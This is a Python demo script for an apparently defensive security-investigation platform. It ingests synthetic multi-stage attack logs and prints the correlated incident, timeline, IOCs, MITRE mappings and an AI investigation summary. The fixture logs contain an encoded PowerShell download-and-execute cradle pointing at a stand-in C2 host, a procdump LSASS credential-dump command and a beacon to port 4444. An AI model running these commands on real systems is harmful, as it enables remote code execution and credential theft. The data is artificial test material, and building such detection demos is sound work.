import json
from datetime import datetime, timezone
from app.core.database import SessionLocal, init_db
from app.modules.ingestion.service import LogIngestionService
from app.modules.correlation.service import EventCorrelationService
from app.modules.timeline.service import AttackTimelineService
from app.modules.mitre.service import MitreMappingService
from app.modules.extraction.service import EntityIOCExtractionService
from app.modules.investigation.service import EvidenceGroundedAIInvestigationService
from app.modules.investigation.evidence_builder import StructuredEvidenceBuilder


def run_phase5_demo():
    print("=" * 80)
    print("PHASE 5 — ATTACK INTELLIGENCE + EVIDENCE-GROUNDED AI INVESTIGATION DEMO")
    print("=" * 80)

    init_db()
    db = SessionLocal()
    try:
        ingest_svc = LogIngestionService()
        corr_svc = EventCorrelationService()
        timeline_svc = AttackTimelineService()
        mitre_svc = MitreMappingService()
        extraction_svc = EntityIOCExtractionService()
        inv_svc = EvidenceGroundedAIInvestigationService()
        evidence_builder = StructuredEvidenceBuilder()

        # Step 0: Ingest multi-stage attack sequence
        attack_telemetry = [
            {
                "source": "windows_security",
                "EventID": 4624,
                "TimeCreated": "2026-09-12T04:00:00Z",
                "Computer": "PROD-APP-01.corp.internal",
                "TargetUserName": "svc_backup",
                "LogonType": 3,
            },
            {
                "source": "powershell",
                "EventID": 4104,
                "TimeCreated": "2026-09-12T04:05:00Z",
                "Computer": "PROD-APP-01.corp.internal",
                "UserId": "svc_backup",
                "ScriptBlockText": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGYAaQBsAC0AYwAyAC4AeAB5AHoALwBzAC4AcABzADEAJwApAA==",
                "attack_id": "T1059.001",
            },
            {
                "source": "edr",
                "TimeCreated": "2026-09-12T04:10:00Z",
                "ComputerName": "PROD-APP-01.corp.internal",
                "AccountName": "SYSTEM",
                "event_type": "LSASSDump",
                "process_name": "procdump.exe",
                "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
                "confidence": 0.95,
                "attack_id": "T1003.001",
            },
            {
                "source": "network",
                "TimeCreated": "2026-09-12T04:15:00Z",
                "SourceIp": "10.0.1.99",
                "Computer": "PROD-APP-01.corp.internal",
                "DestinationIp": "185.220.101.5",
                "DestinationPort": 4444,
                "action": "ALLOW",
                "attack_id": "T1071.001",
            },
        ]

        ingest_svc.ingest_batch(db, attack_telemetry)
        corr_res = corr_svc.run_correlation(db)
        
        # 1. Existing Incident
        incidents = corr_svc.list_incidents(db)
        target_incident = next((i for i in incidents if "PROD-APP-01" in i.title or len(i.event_ids) >= 3), incidents[0])

        print("\n1. EXISTING INCIDENT:")
        print(f"   Incident ID:  {target_incident.id}")
        print(f"   Title:        {target_incident.title}")
        print(f"   Severity:     {target_incident.severity}")
        print(f"   Status:       {target_incident.status}")
        print(f"   Event IDs:    {target_incident.event_ids}")

        # 2. Real Constituent Events
        print(f"\n2. REAL SECURITY EVENTS ASSOCIATED WITH INCIDENT ({len(target_incident.event_ids)} events):")
        incident_detail = corr_svc.get_incident_with_events(db, target_incident.id)
        if incident_detail:
            for evt in incident_detail["events"]:
                print(f"   - [{evt.event_id}] {evt.timestamp.isoformat()} | {evt.source} | {evt.event_type} | Severity: {evt.severity}")

        # 3. Generated Chronological Timeline
        print("\n3. RECONSTRUCTED ATTACK TIMELINE:")
        timeline = timeline_svc.build_timeline(db, target_incident.id)
        for t in timeline:
            print(f"   [Sequence {t.sequence}] {t.timestamp.isoformat()} | Title: {t.title}")
            print(f"      Source Event: {t.source_event_id}")
            print(f"      Narrative:    {t.description}")

        # 4. Extracted IOC Information
        print("\n4. ASSOCIATED EXTRACTED & ENRICHED IOCs:")
        ioc_extraction = extraction_svc.extract_and_store_from_events(db, target_incident.event_ids)
        for ioc in ioc_extraction.get("iocs", [])[:5]:
            print(f"   - [{ioc.type.upper()}] {ioc.value} (ID: {ioc.id} | Confidence: {ioc.confidence_score} | Tags: {ioc.tags})")

        # 5. MITRE Techniques with Supporting Evidence
        print("\n5. MITRE ATT&CK TECHNIQUE MAPPINGS:")
        mitre_mappings = mitre_svc.map_incident_techniques(db, target_incident.id)
        for m in mitre_mappings:
            print(f"   - {m['technique_id']} : {m['name']} (Tactic: {m['tactic']} | Nature: {m['evidence_nature'].upper()})")
            print(f"     Supporting Event IDs: {m['supporting_event_ids']}")

        # 6. Structured Evidence Package Sent to AI
        print("\n6. STRUCTURED EVIDENCE PACKAGE:")
        evidence_package = evidence_builder.build_evidence_package(db, target_incident.id)
        print(f"   Incident Context: {evidence_package['incident']['title']} ({evidence_package['incident']['severity']})")
        print(f"   Timeline Milestones Included: {len(evidence_package['timeline'])}")
        print(f"   MITRE Techniques Included:   {len(evidence_package['mitre_techniques'])}")
        print(f"   IOC Entities Included:       {len(evidence_package['iocs'])}")
        print(f"   Formal Evidence Artifacts:   {len(evidence_package['evidence_items'])}")

        # 7. AI Investigation Result
        print("\n7. EVIDENCE-GROUNDED AI INVESTIGATION RESULT:")
        inv_res = inv_svc.investigate_incident(db, target_incident.id)
        investigation = inv_res["investigation"]
        print(f"   Investigation ID: {investigation.id}")
        print(f"   Confidence Score: {investigation.confidence_score}")
        print(f"   Referenced Evidence IDs: {investigation.evidence_ids}")
        print(f"\n--- AI INVESTIGATION FINDINGS ---")
        print(investigation.summary)
        print(f"---------------------------------")

        # 8. Prioritized Next Investigation / Response Actions
        print("\n8. RECOMMENDED NEXT INVESTIGATION & RESPONSE STEPS:")
        for idx, act in enumerate(inv_res["recommended_actions"], 1):
            print(f"   [{idx}] Action: {act.action_type.upper()} | Priority: {act.priority} | Automated: {act.automated}")
            print(f"       Instruction: {act.description}")

        print("\n" + "=" * 80)
        print("PHASE 5 DEMO COMPLETE — ALL REQUIREMENTS VERIFIED")
        print("=" * 80)

    finally:
        db.close()


if __name__ == "__main__":
    run_phase5_demo()
